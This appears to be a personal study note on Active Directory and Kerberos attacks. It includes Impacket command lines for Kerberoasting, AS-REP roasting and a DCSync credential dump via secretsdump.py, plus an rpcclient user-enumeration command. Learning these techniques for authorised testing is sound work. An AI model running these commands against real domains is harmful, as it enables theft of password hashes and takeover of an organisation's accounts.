**Active Directory (AD)** is Microsoft’s directory service for managing **users, computers, groups, and resources** in a **Windows domain environment**.

**DC** : Domain Controller

- **Forest** → the highest level (can contain multiple domains).
- **Tree** → sub domains
- **Domain** → a logical grouping of objects (users, computers, groups).
- **Organizational Unit (OU)** → container for grouping objects for easier management.
- **Objects** → actual resources (users, computers, printers, etc.).




---

RPC : 
**RPC (Remote Procedure Call)** is a communication protocol that lets a program **run a function (procedure) on another computer** as if it were local.

rpcclient ``ip`` -U username ===========> enumdomusers , enumdomgroups

---

**Distinguish Name :** A method to descrip an object , by going back until the DC .
example : CN=yahia, OU=users , OU=technical_depatrment, DC=nexus , DC=local

---

#### Kerberos authentication : 
what is kerberos : is an authentication protocol , port 88 TCP/UDP

**KDC :** Key Distribution Center
**AS :** Authentication Service
**TGS :** Ticket Granting Service

the DC contain the KDC , they have all the users with their hashed password , and all the services with their hashed password also .


session key
service session key 

KRBTGT

![[Pasted image 20250830142013.png]]

---


### Attacks : 

##### - Kerberosting : 
crack the TGS ticket , i mean crack the hash of the password of the service

python3 GetUserSPNs.py domain_name/user_name:password -dc-ip domain_ip
python3 GetUserSPNs.py domain_name/user_name:password -dc-ip domain_ip -request

u will get a hash , crack it 


##### - AS-REP Roasting : 

when the pre-authentication is disabled , the attacker will request a TGT of another user , and try to crack the hash of the user 

python3 GetNPUsers.py domain_name/victim_username -dc-ip domain_ip


##### - Full Control Using Bloodhound : 

install it and learn how to use it 

##### - DC Sync Attack : 
try to get the database of the DC .
python3 secretsdump.py domain_name/user_name:password@ip -use-vss

##### - Golden Ticket Attack : 

the attacker try to get the password of the KRBTGT , by crack the hash of that password 
##### Tools : 
cd /opt/impacket/examples

python3 GetUserSPNs.py domain_name/user_name:password -dc-ip domain_ip
python3 GetUserSPNs.py domain_name/user_name:password -dc-ip domain_ip -request
